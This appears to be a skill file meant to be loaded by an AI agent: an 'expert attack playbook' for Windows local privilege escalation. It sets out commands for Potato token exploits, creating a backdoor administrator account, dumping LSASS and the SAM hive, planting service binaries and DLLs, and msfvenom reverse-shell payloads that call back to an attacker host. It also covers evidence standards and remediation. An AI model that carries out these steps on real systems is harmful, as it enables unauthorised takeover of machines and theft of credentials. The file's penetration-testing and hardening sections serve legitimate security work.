---
name: windows-privilege-escalation
description: >-
  Windows local privilege escalation playbook. Use when you have low-privilege shell access on Windows and need to escalate via token abuse, Potato exploits, service misconfigurations, DLL hijacking, UAC bypass, or registry autoruns.
---

# SKILL: Windows Local Privilege Escalation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert Windows privesc techniques. Covers token manipulation, Potato family, service misconfigurations, DLL hijacking, AlwaysInstallElevated, scheduled task abuse, registry autoruns, and named pipe impersonation. Base models miss nuanced privilege prerequisites and OS-version-specific constraints.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after escalation for pivoting to other hosts
- [windows-av-evasion](../windows-av-evasion/SKILL.md) when AV/EDR blocks your privesc tools
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) when the host is domain-joined and you need AD-level escalation
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for domain privilege escalation via ACL misconfigurations

### Advanced Reference

Also load [TOKEN_POTATO_TRICKS.md](./TOKEN_POTATO_TRICKS.md) when you need:
- Detailed Potato family comparison (JuicyPotato → GodPotato evolution)
- OS-version-specific exploit selection
- Required privileges and protocol details per variant

Also load [UAC_BYPASS_METHODS.md](./UAC_BYPASS_METHODS.md) when you need:
- UAC bypass technique matrix (fodhelper, eventvwr, sdclt, etc.)
- Auto-elevate binary abuse
- Mock trusted directory tricks

---

## 1. ENUMERATION CHECKLIST

### System Context

```cmd
whoami /all                        & REM Current user, groups, privileges
systeminfo                         & REM OS version, hotfixes, architecture
hostname                           & REM Machine name
net user %USERNAME%                & REM Group memberships
```

### Token Privileges (Critical)

```cmd
whoami /priv
```

| Privilege | Escalation Path |
|---|---|
| `SeImpersonatePrivilege` | Potato family exploits (§2) |
| `SeAssignPrimaryTokenPrivilege` | Token manipulation, Potato variants |
| `SeDebugPrivilege` | Dump LSASS, inject into SYSTEM processes |
| `SeBackupPrivilege` | Read any file (SAM/SYSTEM/NTDS.dit) |
| `SeRestorePrivilege` | Write any file (DLL hijack, service binary) |
| `SeTakeOwnershipPrivilege` | Take ownership of any object |
| `SeLoadDriverPrivilege` | Load vulnerable kernel driver → kernel exploit |

### Services & Scheduled Tasks

```cmd
sc query state= all                & REM All services
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
schtasks /query /fo LIST /v        & REM Verbose scheduled task list
```

### Installed Software & Patches

```cmd
wmic product get name,version
wmic qfe list                      & REM Installed patches
```

### Network & Credentials

```cmd
netstat -ano                       & REM Listening ports + PIDs
cmdkey /list                       & REM Stored credentials
dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
```

---

## 2. TOKEN MANIPULATION & POTATO EXPLOITS

### SeImpersonatePrivilege Abuse

Service accounts (IIS AppPool, MSSQL, etc.) typically hold `SeImpersonatePrivilege`. This enables impersonation of any token presented to you.

| Tool | OS Support | Protocol | Notes |
|---|---|---|---|
| **JuicyPotato** | Win7–Server2016 | COM/DCOM | Requires valid CLSID; patched on Server2019+ |
| **RoguePotato** | Server2019+ | OXID resolver redirect | Needs controlled machine on port 135 |
| **PrintSpoofer** | Win10/Server2016-2019 | Named pipe via Print Spooler | Simple, fast; Spooler must run |
| **SweetPotato** | Broad | COM + Print + EFS | Combines multiple techniques |
| **GodPotato** | Win8–Server2022 | DCOM RPCSS | Works on latest patched systems |

```cmd
# PrintSpoofer (simplest for modern systems)
PrintSpoofer64.exe -i -c "cmd /c whoami"

# GodPotato (broadest compatibility)
GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"

# JuicyPotato (legacy systems)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}
```

### SeDebugPrivilege Abuse

```powershell
# Dump LSASS (if SeDebugPrivilege is enabled)
procdump -ma lsass.exe lsass.dmp

# Or migrate into a SYSTEM process
# Meterpreter: migrate to winlogon.exe / services.exe
```

---

## 3. SERVICE MISCONFIGURATIONS

### Unquoted Service Paths

```cmd
# Find unquoted paths with spaces
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

If path is `C:\Program Files\My App\service.exe`, Windows tries:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe`

Place malicious binary at first writable location.

### Weak Service Permissions

```cmd
# Check service ACL with accesschk (Sysinternals)
accesschk64.exe -wuvc * /accepteula
# Look for: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
```

```cmd
# Reconfigure service to run attacker binary
sc config vuln_svc binpath= "C:\temp\rev.exe"
sc stop vuln_svc
sc start vuln_svc
```

### Writable Service Binaries

```cmd
# Check if current user can write to the service binary path
icacls "C:\Program Files\VulnApp\service.exe"
# (F) = Full, (M) = Modify, (W) = Write → replace binary
```

---

## 4. DLL HIJACKING

### DLL Search Order (Standard)

1. Directory of the executable
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Current directory
6. Directories in `%PATH%`

### Exploitation

```cmd
# Find missing DLLs (use Process Monitor)
# Filter: Result=NAME NOT FOUND, Path ends with .dll

# Compile malicious DLL
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll > evil.dll

# Place in writable directory that comes before the real DLL location
```

### Known Phantom DLL Targets

| Application | Missing DLL | Drop Location |
|---|---|---|
| Various .NET apps | `profapi.dll` | Application directory |
| Windows services | `wlbsctrl.dll` | `%PATH%` writable dir |
| Third-party updaters | `VERSION.dll` | Application directory |

---

## 5. ALWAYSINSTALLELEVATED

```cmd
# Check both registry keys — BOTH must be set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```cmd
# Generate MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 6. SCHEDULED TASK ABUSE

```cmd
# Enumerate tasks with writable scripts or missing binaries
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Schedule Type"

# Check permissions on task binary
icacls "C:\path\to\task\binary.exe"

# If writable: replace binary, wait for task execution
# If missing: place your binary at the expected path
```

### Scheduled Task via PowerShell

```powershell
# If you can create tasks (unlikely from low priv, useful post-UAC-bypass)
$action = New-ScheduledTaskAction -Execute "C:\temp\rev.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger -User "SYSTEM"
```

---

## 7. REGISTRY AUTORUNS

```cmd
# Check writable autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Check permissions with accesschk
accesschk64.exe -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /accepteula
```

If an autorun entry points to a writable path → replace binary or inject new entry.

---

## 8. NAMED PIPE IMPERSONATION

```powershell
# Service account creates a named pipe, tricks a SYSTEM process into connecting
# The connecting client's token is then impersonated

# PrintSpoofer leverages this with the Print Spooler:
PrintSpoofer64.exe -i -c powershell.exe
```

Custom named pipe server (requires SeImpersonatePrivilege):
```powershell
# Create pipe → coerce SYSTEM connection → ImpersonateNamedPipeClient() → SYSTEM token
```

---

## 9. AUTOMATED TOOLS

| Tool | Purpose | Command |
|---|---|---|
| **winPEAS** | Comprehensive Windows enumeration | `winPEASx64.exe` |
| **PowerUp** | Service/DLL/registry misconfig checks | `Invoke-AllChecks` |
| **Seatbelt** | Security-focused host survey | `Seatbelt.exe -group=all` |
| **SharpUp** | C# port of PowerUp checks | `SharpUp.exe audit` |
| **PrivescCheck** | PowerShell privesc checker | `Invoke-PrivescCheck` |
| **BeRoot** | Common misconfig finder | `beRoot.exe` |

---

## 10. PRIVILEGE ESCALATION DECISION TREE

```
Low-privilege shell on Windows
│
├── whoami /priv → SeImpersonatePrivilege?
│   ├── Yes → Potato family (§2)
│   │   ├── Server2019+/Win11 → GodPotato or PrintSpoofer
│   │   ├── Server2016/Win10 → PrintSpoofer or SweetPotato
│   │   └── Older → JuicyPotato (need CLSID)
│   └── SeDebugPrivilege? → LSASS dump / process injection
│
├── Service misconfigurations?
│   ├── Unquoted path with spaces + writable dir? → binary plant (§3)
│   ├── SERVICE_CHANGE_CONFIG on service? → reconfigure binpath (§3)
│   └── Writable service binary? → replace executable (§3)
│
├── DLL hijacking opportunity?
│   ├── Missing DLL in search path? → plant malicious DLL (§4)
│   └── Writable directory in %PATH%? → DLL plant (§4)
│
├── AlwaysInstallElevated set?
│   └── Both HKLM+HKCU = 1 → MSI payload (§5)
│
├── Scheduled task abuse?
│   ├── Task runs as SYSTEM with writable binary? → replace (§6)
│   └── Task references missing binary? → plant binary (§6)
│
├── Registry autorun writable?
│   └── Writable binary path → replace on next login/reboot (§7)
│
├── UAC bypass needed? (medium integrity → high integrity)
│   └── Load UAC_BYPASS_METHODS.md
│
├── Stored credentials?
│   ├── cmdkey /list → runas /savecred
│   ├── Autologon in registry? → plaintext creds
│   └── WiFi passwords, browser creds, DPAPI
│
└── None of the above?
    ├── Run winPEAS for comprehensive scan
    ├── Check internal services (netstat -ano)
    ├── Look for sensitive files (unattend.xml, web.config, *.config)
    └── Check for kernel exploits (systeminfo → Windows Exploit Suggester)
```

---

---

## 11. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | What **identity and integrity level** do you hold, from `whoami /all` and the token? | the starting privilege |
| 2 | Which **privilege or misconfiguration** is the escalation primitive, named exactly? | the fix location |
| 3 | Did the **control action fail** before the exploit ran? | escalation, not your baseline |
| 4 | Did `whoami` **change after** the technique executed? | the technique worked, not just ran |
| 5 | Did you **read or write something the new privilege reaches** (a hive, a protected path)? | impact |
| 6 | Does the primitive sit on the **target's own build**, not a lab host? | applicability |
| 7 | Did you **revert** any change, and verify it? | engagement integrity |

**The before/after identity pair is the bar.** An exploit that prints output but leaves you at the same
identity has not escalated, and the pair is the whole evidence.

---

## 12. EXECUTION PRIMITIVES

Privilege escalation is proven by **an identity change, paired with the same action failing beforehand**.
Every block ends at a changed identity or a read the new privilege unlocks.

### 12.1 Enumeration and the control baseline

```powershell
whoami /all
whoami /priv
whoami /groups | findstr /i "Mandatory Label"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
# THE CONTROL: the actions that must FAIL at your current level - record them verbatim
reg save HKLM\SAM C:\tmp\sam-control.hiv /y 2>&1 | Select-Object -First 2
copy C:\Windows\System32\config\SYSTEM C:\tmp\ 2>&1 | Select-Object -First 2
icacls C:\Windows\System32\config\SAM 2>&1 | Select-Object -First 3
```

**Record the failing control first.** Everything after is a delta against it, and the delta is what
separates an escalation from an action you already had the right to perform.

### 12.2 Token and Potato techniques, with the pair

```powershell
# which tokens are available, and whether SeImpersonate is present
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken SeDebug"
# the sequence that proves escalation: identity, exploit, identity
whoami                                                    # BEFORE
.\GodPotato.exe -cmd "cmd /c whoami" 2>&1 | Select-Object -Last 2
.\PrintSpoofer64.exe -i -c "cmd /c whoami" 2>&1 | Select-Object -Last 2
.\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami" 2>&1 | Select-Object -Last 2
# and the control that shows the same binary without the privilege does NOT escalate
.\GodPotato.exe -cmd "cmd /c whoami" 2>&1 | Select-Object -Last 2   # run from a non-privileged token
# then the read that proves the boundary moved
reg save HKLM\SAM C:\tmp\sam-after.hiv /y 2>&1 | Select-Object -First 2
```

**The identity triple (before, exploit, after) plus the control token is the evidence.** Note which
specific privilege the exploit required; the two that matter are `SeImpersonate` and `SeDebug`.

### 12.3 Service misconfiguration, with the writable path proven

```powershell
# the services whose binary path or directory is writable by your user
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike 'C:\Windows\*' } |
  Select-Object Name,StartName,PathName,State | Format-Table -AutoSize
accesschk64.exe -wuvc "Everyone" * 2>&1 | Select-Object -First 20
accesschk64.exe -uwcqv "BUILTIN\Users" * 2>&1 | Select-Object -First 20
# the control: confirm the directory is writable BEFORE exploiting
icacls "C:\Program Files\VulnerableApp" 2>&1 | Select-Object -First 5
copy /y C:\tmp\payload.exe "C:\Program Files\VulnerableApp\service.exe" 2>&1 | Select-Object -First 2
# the escalation and the read that follows
sc.exe stop VulnSvc; sc.exe start VulnSvc 2>&1 | Select-Object -First 2
whoami
reg save HKLM\SAM C:\tmp\sam-svc.hiv /y 2>&1 | Select-Object -First 2
```

**`icacls` showing your user as writable is the candidate; the service restart under your payload is
the finding.** A service whose path you can overwrite but which never restarts is a hardening note.

### 12.4 DLL hijacking, with the load proven

```powershell
# the missing-DLL inventory for the target executable
.\Listdlls64.exe TARGET.exe 2>&1 | Select-Object -First 20
.\ProcessMonitor.exe /Quiet /Minimized 2>$null    # filter: Result = NAME NOT FOUND, Path ends .dll
# the writable search-order location
icacls "C:\Path\To\Writable" 2>&1 | Select-Object -First 5
copy /y C:\tmp\evil.dll "C:\Path\To\Writable\missing.dll" 2>&1 | Select-Object -First 2
# restart the service and confirm the DLL loaded - a marker in the DLL is the proof
sc.exe stop TARGET; sc.exe start TARGET 2>&1 | Select-Object -First 2
Get-Content C:\tmp\dll-loaded-marker.txt 2>$null
whoami
```

**The marker file written by the DLL is the proof.** A `NAME NOT FOUND` entry in Process Monitor is a
candidate; a loaded DLL that executed your code is the finding.

### 12.5 AlwaysInstallElevated and registry autoruns

```powershell
# the AlwaysInstallElevated state, which is a two-key check
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1 | Select-Object -First 3
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1 | Select-Object -First 3
# the MSI that escalates, and the identity after it
msiexec /quiet /qn /i C:\tmp\payload.msi 2>&1 | Select-Object -First 2
whoami
# the autoruns with a writable path
Get-CimInstance Win32_StartupCommand | Select-Object Name,Command,Location,User | Format-Table -AutoSize
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 2>&1 | Select-Object -First 10
```

**Both registry keys set is the precondition; a SYSTEM shell from the MSI is the finding.** One key
alone does not escalate, and reporting it is a false positive this technique produces constantly.

### 12.6 The end-to-end harness

```powershell
$ErrorActionPreference='SilentlyContinue'
Write-Host "BEFORE : " (whoami)
Write-Host "INTEGRITY: " ((whoami /groups | Select-String 'Mandatory Label') -join '')
Write-Host "PRIVS  : " (((whoami /priv) -join ' ') -replace '\s+',' ')
Write-Host ""
Write-Host "CONTROL ACTIONS (these must FAIL now):"
& cmd /c "reg save HKLM\SAM C:\tmp\ctl.hiv /y >NUL 2>&1 && echo SAM-READ-OK || echo SAM-DENIED"
& cmd /c "copy C:\Windows\System32\config\SYSTEM C:\tmp\ >NUL 2>&1 && echo SYS-READ-OK || echo SYS-DENIED"
Write-Host ""
Write-Host "TECHNIQUE: <name> - record the exact command you ran"
Write-Host "AFTER  : <whoami output>"
Write-Host ""
Write-Host "REVERT : remove every file and service you changed, then re-run the CONTROL block"
```

**Before, control, technique, after, revert.** A privesc report missing the before/after pair is
unverifiable, and the control block is what makes the escalation a finding.

---

## 13. EVIDENCE STANDARD — CHAIN ARTEFACTS

| Item | Why |
|---|---|
| The **identity and integrity level before** | the baseline |
| The **control action that failed before** | proves escalation |
| The **technique and the exact command** | reproducibility |
| The **identity after** | the escalation result |
| The **privilege or permission misconfiguration**, named | the fix location |
| The **OS build**, because these techniques are version-bound | applicability |
| The **read or write the new level unlocked** | impact |
| The **event IDs** the activity generated (7045, 4688, 4672) | the blue-team half |
| The **revert command and its verification** | engagement integrity |
| That the host is the **target's, not a lab** | validity |

Report the **pair and the boundary**: "as `CORP\user1` at medium integrity, `whoami /priv` shows
`SeImpersonatePrivilege` enabled and `reg save HKLM\SAM` returns `ERROR: Access is denied`, which is the
control. `PrintSpoofer64.exe -i -c "cmd /c whoami"` on Windows Server 2019 build 17763 returns
`nt authority\system`, and the same `reg save` then succeeds, writing a hive from which a local
administrator's hash is recovered. The host is the client's production file server, verified by
hostname and domain membership", never "the host is vulnerable to privilege escalation".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A technique that ran but left you at the **same identity** | it failed; the before/after pair shows it |
| `SeImpersonate` present with **no working exploit** | a hardening note until demonstrated |
| One of the two **AlwaysInstallElevated** keys set | the escalation needs both |
| A writable directory with **no process that loads from it** | no path |
| A `NAME NOT FOUND` DLL entry **with no restart opportunity** | a candidate, not a finding |
| An escalation on a **lab VM you built** | tests your own environment |
| A technique that required **administrator rights already** | no escalation |
| A UAC bypass that yields **high integrity in the same user** | not SYSTEM; state the level honestly |
| A vulnerable service **already patched on the target's build** | verify the build before reporting |
| `systeminfo` output as evidence of missing patches | a configuration listing, not a finding |
| A recovered hash reproduced in full | a disclosure |

**The pair, or it is not an escalation.** This family produces the most false positives of any in the
package, and all of them are the same error: reporting a candidate as a crossed boundary.

---

## 14. REMEDIATION REFERENCE

1. **Remove `SeImpersonatePrivilege` and `SeDebugPrivilege` from accounts and services that do not need them** - every Potato technique in this document begins with one of these two.
2. **Restrict write access on service binary paths and their parent directories** - the service misconfiguration is an ACL error and it is fixable with one `icacls`.
3. **Quote service binary paths and audit every unquoted path that contains a space** - the unquoted service path is the classic and it is a one-character fix.
4. **Never set `AlwaysInstallElevated`, and enforce that with Group Policy on both the user and machine hives** - the two-key check makes this a policy audit rather than a per-host fix.
5. **Set `UAC` to the highest level and require admin approval for the built-in Administrator**, and prefer the secure desktop prompt - the auto-elevate paths depend on the UAC configuration.
6. **Remove `BUILTIN\Users` write permissions from `%ProgramFiles%`, `%ProgramData%`, and the `PATH` directories** - the DLL search order makes any of them a hijack location.
7. **Apply least privilege to service accounts, and prefer virtual accounts and gMSAs to shared credentials** - it bounds what a compromised service yields.
8. **Patch the OS and verify the build against known local privesc CVEs** - the kernel and component paths are version-bound and the check is a build comparison.
9. **Enable LSA protection and Credential Guard** - it removes the post-escalation credential harvesting that makes the escalation valuable.
10. **Alert on token manipulation (4672), service creation (7045), and process creation from `C:\tmp` and `%TEMP%`** - each technique here generates one of those events.
11. **Segment administrative rights, and require a separate, tiered account for administrative work** - a local escalation on a workstation is materially different from one on a server, and the account split makes that explicit.

---

## 15. RELATED SIBLINGS - LOAD TOGETHER

- [windows-postexploit](../windows-postexploit/SKILL.md) - what follows once the boundary is crossed
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) - the reach of the credential you obtain
- [windows-lolbins-execution-bypass](../windows-lolbins-execution-bypass/SKILL.md) - running the tooling under application control
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) - where a domain credential harvested after escalation is used
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) - the sibling playbook with the same control discipline
